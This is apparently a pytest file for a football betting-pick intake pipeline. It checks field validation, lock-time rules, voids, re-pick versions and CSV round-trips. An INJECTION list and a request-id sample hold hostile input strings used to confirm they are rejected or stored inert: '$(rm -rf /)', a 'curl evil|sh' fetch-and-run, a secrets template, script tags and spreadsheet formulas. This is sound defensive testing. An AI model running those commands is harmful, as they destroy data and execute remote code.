"""Pick intake validation. No live schedule or odds calls."""

from __future__ import annotations

import csv
import io
from datetime import timedelta
from pathlib import Path

from football_pipeline.intake import PICK_ID_RE, IntakeError, IntakeFields, apply_intake, clean_writeup
from football_pipeline.nflv import load_games
from football_pipeline.schema import PICK_COLUMNS, format_ts, parse_pick_file, row_sha
from tests.conftest import run_cli

REQUEST = "123e4567-e89b-42d3-a456-426614174000"
OPEN = "2099_03_GB_CHI"
OTHER = "2099_03_DET_PHI"
FAR = "2099_08_DAL_NYG"
INJECTION = (
    "$(rm -rf /)",
    "`reboot`",
    "${{ secrets.X }}",
    '"; curl evil|sh',
    "---\nfoo: bar",
    "<script>",
    "=cmd|",
)


def test_good_spread_total_blank_line_and_csv_round_trip(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    spread = _apply(
        root,
        schedules,
        now,
        market="spread",
        side="GB",
        line="-2.5",
        confidence="2",
        writeup="GB plus the points",
    )
    assert spread == f"{OPEN}-spread"
    total = _apply(
        root,
        schedules,
        now,
        market="total",
        side="under",
        line="45.5",
        confidence="",
        writeup="",
    )
    assert total == f"{OPEN}-total"
    blank = _apply(root, schedules, now, game_id=OTHER, market="spread", side="DET", line="")
    assert blank == f"{OTHER}-spread"

    rows = _rows(root)
    by_id = {row["pick_id"]: row for row in rows}
    assert by_id[spread]["side"] == "GB"
    assert by_id[spread]["line_at_pick"] == "-2.5"
    assert by_id[spread]["picked_at"] == format_ts(now)
    assert by_id[spread]["units"] == "1.0"
    assert by_id[spread]["confidence"] == "2"
    assert by_id[spread]["tags"] == ""
    assert by_id[spread]["note"] == ""
    assert by_id[spread]["action"] == "pick"
    assert by_id[total]["confidence"] == ""
    assert by_id[total]["line_at_pick"] == "45.5"
    # Latest pre-kick home spread is -3, so the away side is 3. The post-kick -10 is ignored.
    assert by_id[blank]["line_at_pick"] == "3"
    _assert_round_trip(root)

    spread_md = _markdown(root, spread)
    assert spread_md[1] == "GB plus the points"
    assert 'pick_id: "2099_03_GB_CHI-spread"' in spread_md[0]
    total_md = _markdown(root, total)
    assert total_md[1] == ""


def test_lock_rejects_the_runner_clock_the_server_time_and_a_future_stamp(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    lock = kick[OPEN] - timedelta(minutes=10)
    early = lock - timedelta(hours=1)

    runner = _fail(root, schedules, lock, server=early)
    assert "runner clock is at or after the 10-minute lock" in str(runner)
    assert not _rows(root)
    assert not (root / "src" / "content" / "picks").exists()

    server = _fail(root, schedules, lock - timedelta(minutes=1), server=lock)
    assert "server_received_at is at or after the 10-minute lock" in str(server)
    assert not _rows(root)

    future = _fail(root, schedules, early, server=early + timedelta(minutes=5, seconds=1))
    assert "more than 5 minutes ahead" in str(future)
    assert not _rows(root)

    accepted = _apply(root, schedules, early, server=early + timedelta(minutes=5))
    assert accepted == f"{OPEN}-spread"


def test_unknown_closed_week_duplicate_and_bad_fields(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)

    unknown = _fail(root, schedules, now, game_id="2099_03_NO_XX")
    assert "not in the schedule" in str(unknown)
    closed = _fail(root, schedules, now, game_id=FAR, side="DAL")
    assert "not in the open week" in str(closed)
    bad_side = _fail(root, schedules, now, side="over")
    assert "side is not valid" in str(bad_side)
    assert "over" not in str(bad_side)
    bad_market = _fail(root, schedules, now, market="moneyline")
    assert "market must be spread or total" in str(bad_market)
    for line in ("3.25", "31", "-30.5", "abc", "=cmd|"):
        failed = _fail(root, schedules, now, line=line)
        assert "line" in str(failed)
        assert line not in str(failed)
    edge = _apply(root, schedules, now, line="-30", game_id=OTHER, side="PHI")
    assert edge == f"{OTHER}-spread"
    bad_total = _fail(root, schedules, now, market="total", side="over", line="19")
    assert "total range" in str(bad_total)
    assert _apply(root, schedules, now, market="total", side="over", line="20")
    for confidence in ("0", "4", "1.5", "high"):
        failed = _fail(root, schedules, now, confidence=confidence, game_id=OPEN, market="spread", side="CHI", line="1")
        assert "confidence" in str(failed)
    missing_line = _fail(root, schedules, now, game_id=FAR, side="NYG", market="spread", line="-3")
    assert "not in the open week" in str(missing_line)
    missing_line = _fail(root, schedules, now, game_id=OTHER, market="total", side="over", line="")
    assert "no snapshot line" in str(missing_line)

    _apply(root, schedules, now, market="spread", side="CHI", line="1")
    duplicate = _fail(root, schedules, now, market="spread", side="CHI", line="1.5")
    assert str(duplicate) == f"active pick exists: {OPEN}-spread"
    assert len(_rows(root)) == 3


def test_void_before_the_lock_and_rejected_voids(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    pick_id = _apply(root, schedules, now, line="-3", side="CHI", writeup="keep me")
    md_before = (root / "src" / "content" / "picks" / f"{pick_id}.md").read_bytes()
    blocked = _fail(root, schedules, now, side="GB", line="-1")
    assert str(blocked) == f"active pick exists: {pick_id}"
    voided = _apply(
        root,
        schedules,
        now + timedelta(minutes=30),
        action="void",
        void_pick_id=pick_id,
        server=now + timedelta(minutes=20),
    )
    assert voided == pick_id
    assert (root / "src" / "content" / "picks" / f"{pick_id}.md").read_bytes() == md_before
    rows = _rows(root)
    assert [row["action"] for row in rows] == ["pick", "void"]
    assert rows[1]["picked_at"] == format_ts(now + timedelta(minutes=20))
    assert rows[1]["side"] == rows[0]["side"]
    assert rows[1]["line_at_pick"] == rows[0]["line_at_pick"]
    _assert_round_trip(root)

    again = _fail(root, schedules, now, action="void", void_pick_id=pick_id)
    assert "already voided" in str(again)
    missing = _fail(root, schedules, now, action="void", void_pick_id=f"{OTHER}-spread")
    assert "does not exist" in str(missing)
    blank = _fail(root, schedules, now, action="void", void_pick_id="")
    assert "void_pick_id is not a pick id" in str(blank)
    on_pick = _fail(root, schedules, now, void_pick_id=pick_id, game_id=OTHER, side="PHI")
    assert "must be blank" in str(on_pick)
    assert len(_rows(root)) == 2

    other_id = _apply(
        root,
        schedules,
        now,
        game_id=OTHER,
        side="PHI",
        line="-3",
        server=now,
    )
    lock = kick[OTHER] - timedelta(minutes=10)
    late = _fail(
        root,
        schedules,
        lock,
        action="void",
        void_pick_id=other_id,
        server=lock - timedelta(hours=1),
    )
    assert "runner clock" in str(late)
    assert len(_rows(root)) == 3


def test_ids_are_rejected_and_writeup_is_stored_verbatim(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    nasty = "\n".join(INJECTION) + "\x00\tkept"
    for game_id in ('=cmd|', '2099_03_GB_CHI"', "2099_03_GB\n_CHI", "2099_03_GB_CHI,spread"):
        failed = _fail(root, schedules, now, game_id=game_id)
        assert "game id pattern" in str(failed)
        assert game_id not in str(failed)
        assert not _rows(root)

    pick_id = _apply(root, schedules, now, writeup=nasty)
    front, body = _markdown(root, pick_id)
    assert body == "\n".join(INJECTION) + "\tkept"
    assert "foo: bar" not in front
    for key in ("pick_id", "game_id", "submitted_at"):
        assert key in front
    assert clean_writeup("a\r\nb\x00c\r") == "a\nbc\n"
    _assert_round_trip(root)

    too_long = _fail(root, schedules, now, game_id=OTHER, side="DET", writeup="x" * 50_001)
    assert "50000" in str(too_long)
    assert "xxx" not in str(too_long)
    exact = _apply(root, schedules, now, game_id=OTHER, side="DET", line="1", writeup="y" * 50_000)
    assert _markdown(root, exact)[1] == "y" * 50_000


def test_cli_prints_the_pick_id_and_a_failure_writes_nothing(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    ok = run_cli(
        ["intake", "--root", str(root), "--schedules", str(schedules), "--now", format_ts(now)],
        env=_env(server=now),
    )
    assert ok.returncode == 0, ok.stderr
    assert ok.stdout == f"pick\n{OPEN}-spread\n{REQUEST}\n"
    assert "::error::" not in ok.stderr

    bad = run_cli(
        ["intake", "--root", str(root), "--schedules", str(schedules), "--now", format_ts(now)],
        env=_env(server=now, market="moneyline"),
    )
    assert bad.returncode == 1
    assert bad.stdout == ""
    assert "::error::market must be spread or total" in bad.stderr
    assert len(_rows(root)) == 1


def test_padded_void_emits_the_validated_action(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    args = ["intake", "--root", str(root), "--schedules", str(schedules), "--now", format_ts(now)]
    made = run_cli(args, env=_env(server=now, action="pick ", request_id=f" {REQUEST} "))
    assert made.returncode == 0, made.stderr
    assert made.stdout == f"pick\n{OPEN}-spread\n{REQUEST}\n"
    voided = run_cli(
        args,
        env=_env(server=now, action="void ", void_pick_id=f" {OPEN}-spread "),
    )
    assert voided.returncode == 0, voided.stderr
    assert voided.stdout == f"void\n{OPEN}-spread\n{REQUEST}\n"
    assert [row["action"] for row in _rows(root)] == ["pick", "void"]


def test_non_uuid_request_id_fails_before_any_write(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    picks = root / "data" / "picks.csv"
    picks.write_text(",".join(PICK_COLUMNS) + "\n", encoding="utf-8")
    before = picks.read_bytes()
    samples = (
        "",
        REQUEST.upper(),
        "123e4567-e89b-12d3-a456-426614174000",
        "../x",
        "$(rm -rf /)",
    )
    for request_id in samples:
        failed = _fail(root, schedules, now, request_id=request_id)
        assert "lowercase uuid v4" in str(failed)
        if request_id:
            assert request_id not in str(failed)
        assert picks.read_bytes() == before
        assert not (root / "src" / "content" / "picks").exists()


def test_append_leaves_blank_action_rows_byte_identical(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    header = ",".join(PICK_COLUMNS)
    legacy = "\n".join(
        [
            header,
            f"{FAR}-spread,{FAR},2099,8,spread,DAL,-3.0,2099-11-02T12:00:00Z,1.0,1,,legacy blank,",
            f"{OTHER}-total,{OTHER},2099,3,total,over,45.0,2099-09-21T12:00:00Z,1.0,2,pace,also blank,",
            "",
        ]
    )
    picks = root / "data" / "picks.csv"
    picks.write_bytes(legacy.encode("utf-8"))
    before_rows, issues = parse_pick_file(picks)
    assert issues == []
    assert [row.cells["action"] for row in before_rows] == ["", ""]
    before_shas = [row.row_sha for row in before_rows]
    filled = dict(before_rows[0].cells)
    filled["action"] = "pick"
    assert before_shas[0] == row_sha(before_rows[0].cells)
    assert before_shas[0] != row_sha(filled)

    _apply(root, schedules, now, market="spread", side="GB", line="-2.5")
    _apply(
        root,
        schedules,
        now,
        action="void",
        void_pick_id=f"{FAR}-spread",
    )
    after = picks.read_bytes()
    original = legacy.encode("utf-8")
    assert after.startswith(original)
    assert after.splitlines()[:3] == original.splitlines()
    after_rows, after_issues = parse_pick_file(picks)
    assert after_issues == []
    assert [row.row_sha for row in after_rows[:2]] == before_shas
    assert [row.cells["action"] for row in after_rows[:2]] == ["", ""]
    assert [row.cells["action"] for row in after_rows[2:]] == ["pick", "void"]


def test_repick_after_void_is_r2_then_r3(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    first = _apply(root, schedules, now, writeup="first")
    assert first == f"{OPEN}-spread"
    _apply(root, schedules, now, action="void", void_pick_id=first)
    second = _apply(root, schedules, now, line="-1", side="CHI", writeup="second")
    assert second == f"{OPEN}-spread-r2"
    assert _markdown(root, first)[1] == "first"
    assert _markdown(root, second)[1] == "second"
    assert (root / "src" / "content" / "picks" / f"{first}.md").is_file()
    _apply(root, schedules, now, action="void", void_pick_id=second)
    third = _apply(root, schedules, now, line="-2", writeup="third")
    assert third == f"{OPEN}-spread-r3"
    blocked = _fail(root, schedules, now, line="1", side="CHI")
    assert str(blocked) == f"active pick exists: {third}"
    superseded = _fail(root, schedules, now, action="void", void_pick_id=first)
    assert "already voided" in str(superseded)
    older = _fail(root, schedules, now, action="void", void_pick_id=second)
    assert "already voided" in str(older)
    assert len(_rows(root)) == 5


def test_repick_without_void_names_the_active_id(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    args = ["intake", "--root", str(root), "--schedules", str(schedules), "--now", format_ts(now)]
    made = run_cli(args, env=_env(server=now, line="-2.5"))
    assert made.returncode == 0, made.stderr
    assert made.stdout == f"pick\n{OPEN}-spread\n{REQUEST}\n"
    again = run_cli(args, env=_env(server=now, line="-1", side="CHI"))
    assert again.returncode == 1
    assert again.stdout == ""
    assert again.stderr == f"::error::active pick exists: {OPEN}-spread\n"
    assert len(_rows(root)) == 1
    assert not (root / "src" / "content" / "picks" / f"{OPEN}-spread-r2.md").exists()


def test_void_of_a_live_older_id_fails_when_a_newer_one_is_active(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    header = ",".join(PICK_COLUMNS)
    base = f"{OPEN}-spread"
    newer = f"{base}-r2"
    rows = "\n".join(
        [
            header,
            f"{base},{OPEN},2099,3,spread,GB,-2.5,{format_ts(now)},1.0,1,,,pick",
            f"{newer},{OPEN},2099,3,spread,CHI,-1.0,{format_ts(now)},1.0,1,,,pick",
            "",
        ]
    )
    (root / "data" / "picks.csv").write_text(rows, encoding="utf-8")
    failed = _fail(root, schedules, now, action="void", void_pick_id=base)
    assert str(failed) == f"void_pick_id {base} is not the active pick"
    assert [row["action"] for row in _rows(root)] == ["pick", "pick"]


def test_pick_id_regex_rejects_r1_r10_and_r02(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    base = f"{OPEN}-spread"
    assert PICK_ID_RE.fullmatch(base)
    assert PICK_ID_RE.fullmatch(f"{base}-r2")
    assert PICK_ID_RE.fullmatch(f"{base}-r9")
    for suffix in ("-r1", "-r10", "-r02"):
        assert PICK_ID_RE.fullmatch(base + suffix) is None
        failed = _fail(root, schedules, now, action="void", void_pick_id=base + suffix)
        assert str(failed) == "void_pick_id is not a pick id"
    assert not _rows(root)


def test_tenth_version_fails(tmp_path: Path):
    root, schedules, kick = _repo(tmp_path)
    now = kick[OPEN] - timedelta(hours=5)
    pick_id = ""
    for version in range(1, 10):
        if pick_id:
            _apply(root, schedules, now, action="void", void_pick_id=pick_id)
        pick_id = _apply(root, schedules, now, line="-2.5", side="GB", writeup=str(version))
        expected = f"{OPEN}-spread" if version == 1 else f"{OPEN}-spread-r{version}"
        assert pick_id == expected
    _apply(root, schedules, now, action="void", void_pick_id=pick_id)
    failed = _fail(root, schedules, now, line="-2.5", side="GB")
    assert str(failed) == "a 10th version is not allowed"
    assert not (root / "src" / "content" / "picks" / f"{OPEN}-spread-r10.md").exists()
    assert len(_rows(root)) == 18


def _repo(tmp_path: Path) -> tuple[Path, Path, dict]:
    root = tmp_path / "repo"
    (root / "data" / "lines").mkdir(parents=True)
    schedules = root / "data" / "schedules.csv"
    schedules.write_text(
        "game_id,season,week,gameday,gametime,away_team,home_team,away_score,home_score,spread_line,total_line\n"
        "2099_03_GB_CHI,2099,3,2099-09-21,13:00,GB,CHI,,,,\n"
        "2099_03_DET_PHI,2099,3,2099-09-21,16:30,DET,PHI,,,,\n"
        "2099_08_DAL_NYG,2099,8,2099-11-02,13:00,DAL,NYG,,,,\n",
        encoding="utf-8",
    )
    games, _source = load_games(fixture=schedules)
    kick = {game.game_id: game.kickoff_utc for game in games}
    open_kick = kick[OPEN]
    other_kick = kick[OTHER]
    (root / "data" / "lines" / "2099_w03.csv").write_text(
        "snapshot_ts,game_id,market,line,n_books,min,max\n"
        f"{format_ts(open_kick - timedelta(hours=6))},{OPEN},spread,-3.5,4,-4,-3\n"
        f"{format_ts(open_kick - timedelta(minutes=40))},{OPEN},spread,-3,5,-3.5,-2.5\n"
        f"{format_ts(open_kick + timedelta(minutes=20))},{OPEN},spread,-10,5,-10,-9\n"
        f"{format_ts(open_kick - timedelta(minutes=40))},{OPEN},total,47.5,6,47,48\n"
        f"{format_ts(other_kick - timedelta(hours=5))},{OTHER},spread,-3.5,4,-4,-3\n"
        f"{format_ts(other_kick - timedelta(minutes=50))},{OTHER},spread,-3,4,-3.5,-2.5\n"
        f"{format_ts(other_kick + timedelta(minutes=20))},{OTHER},spread,-10,4,-11,-9\n",
        encoding="utf-8",
    )
    return root, schedules, kick


def _apply(root, schedules, now, *, server=None, **overrides) -> str:
    try:
        return apply_intake(
            root=root,
            schedules=schedules,
            now=now,
            fields=_fields(server or now, **overrides),
        )
    except IntakeError as exc:
        raise AssertionError(str(exc)) from exc


def _fail(root, schedules, now, *, server=None, **overrides) -> IntakeError:
    try:
        apply_intake(
            root=root,
            schedules=schedules,
            now=now,
            fields=_fields(server or now, **overrides),
        )
    except IntakeError as exc:
        return exc
    raise AssertionError("expected intake to fail")


def _fields(server, **overrides) -> IntakeFields:
    values = {
        "action": "pick",
        "request_id": REQUEST,
        "game_id": OPEN,
        "market": "spread",
        "side": "GB",
        "line": "-2.5",
        "confidence": "1",
        "writeup": "",
        "server_received_at": format_ts(server),
        "void_pick_id": "",
    }
    values.update(overrides)
    if "server" in values:
        raise AssertionError("pass server as a keyword to the helper, not the fields")
    return IntakeFields(**values)


def _env(server, **overrides) -> dict[str, str]:
    fields = _fields(server, **overrides)
    return {
        "ACTION": fields.action,
        "REQUEST_ID": fields.request_id,
        "GAME_ID": fields.game_id,
        "MARKET": fields.market,
        "SIDE": fields.side,
        "LINE": fields.line,
        "CONFIDENCE": fields.confidence,
        "WRITEUP": fields.writeup,
        "SERVER_RECEIVED_AT": fields.server_received_at,
        "VOID_PICK_ID": fields.void_pick_id,
    }


def _rows(root: Path) -> list[dict[str, str]]:
    path = root / "data" / "picks.csv"
    if not path.is_file():
        return []
    with path.open(encoding="utf-8", newline="") as handle:
        return list(csv.DictReader(handle))


def test_csv_writer_round_trips_quotes_and_formula_text(tmp_path: Path):
    from football_pipeline.intake import _append_row
    from football_pipeline.schema import PICK_COLUMNS

    path = tmp_path / "picks.csv"
    cells = {column: "" for column in PICK_COLUMNS}
    cells.update(
        {
            "pick_id": f"{OPEN}-spread",
            "game_id": OPEN,
            "season": "2099",
            "week": "3",
            "market": "spread",
            "side": "GB",
            "line_at_pick": "-2.5",
            "picked_at": "2099-09-21T12:00:00Z",
            "units": "1.0",
            "action": "pick",
            "note": 'say "hi", =cmd|',
        }
    )
    _append_row(path, b"", cells)
    text = path.read_text(encoding="utf-8")
    assert '"say ""hi"", =cmd|"' in text
    with path.open(encoding="utf-8", newline="") as handle:
        parsed = list(csv.DictReader(handle))
    assert parsed[0]["note"] == 'say "hi", =cmd|'
    assert parsed[0]["pick_id"] == cells["pick_id"]


def _assert_round_trip(root: Path) -> None:
    path = root / "data" / "picks.csv"
    text = path.read_text(encoding="utf-8")
    with path.open(encoding="utf-8", newline="") as handle:
        reader = csv.reader(handle)
        header = next(reader)
        body = [row for row in reader if any(cell.strip() for cell in row)]
    assert header[-1] == "action"
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(header)
    writer.writerows(body)
    assert buffer.getvalue() == text
    with path.open(encoding="utf-8", newline="") as handle:
        parsed = list(csv.DictReader(handle))
    assert [row["pick_id"] for row in parsed] == [row[0] for row in body]


def _markdown(root: Path, pick_id: str) -> tuple[str, str]:
    text = (root / "src" / "content" / "picks" / f"{pick_id}.md").read_text(encoding="utf-8")
    _prefix, front, body = text.split("---\n", 2)
    return front, body
